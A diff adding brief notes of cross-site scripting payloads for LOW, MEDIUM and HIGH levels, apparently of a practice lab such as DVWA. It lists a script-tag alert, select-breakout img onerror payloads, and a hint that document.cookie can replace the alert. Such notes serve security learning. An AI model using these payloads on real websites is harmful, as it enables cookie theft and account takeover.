@@ -1,0 +1,13 @@
+LOW : 
+
+<script>alert(1)</script>
+
+MEDIUM : 
+
+</select><img src/onerror=alert(1)>
+
+HIGH: 
+
+&</select><img src/onerror=alert(1)>
+
+Can use document.cookie also 
